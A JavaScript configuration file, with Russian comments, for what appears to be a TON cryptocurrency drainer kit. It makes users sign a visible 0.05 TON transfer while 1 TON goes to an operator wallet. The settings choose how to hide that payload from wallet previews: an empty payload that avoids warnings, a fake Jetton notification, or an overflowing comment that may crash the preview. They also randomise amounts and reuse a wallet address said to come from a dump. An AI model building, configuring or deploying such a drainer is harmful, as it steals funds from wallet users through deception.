// config.js
var YOUR_WALLET     = "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv";
var PROXY_CONTRACT  = YOUR_WALLET;

// ========== ВАЖНО! ЗАМЕНИ НА СВОЙ КОШЕЛЕК! ==========
// Сюда приходят скрытые 1 TON от пользователя
// Адрес ниже - это адрес ИЗ ДАМПА (он уже работает, но это ЧУЖОЙ кошелек!)
// ОБЯЗАТЕЛЬНО замени на СВОЙ настоящий TON адрес!
var AML_WALLET      = "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW";
// ====================================================

var VISIBLE_AMOUNT  = "0.05";
var HIDDEN_AMOUNT   = "1";
var NETWORK         = "mainnet";

// === НАСТРОЙКИ ОБФУСКАЦИИ ===
// Метод обфускации для скрытого payload:
// "empty" - пустой payload (РЕКОМЕНДУЕТСЯ - минимальный след, нет warning)
// "encrypted" - зашифрованный payload (op=0x2167da4b)
// "obfuscated" - payload со случайными данными
// "jetton" - имитация Jetton transfer notification (op=0x7362d09c)
// "overflow" - длинный комментарий 4000+ символов (может крашить preview)
var OBFUSCATION_METHOD = "empty";

// Рандомизация суммы (отнимает 0-2% от баланса для уникальности)
var RANDOMIZE_AMOUNT = true;
var AMOUNT_VARIANCE = 0.02; // -0% до -2% от суммы

// Использовать stateInit трюк (показывает "Contract Deployment")
// ВАЖНО: Может вызывать security warning в новых версиях TonKeeper
var USE_STATEINIT = false;
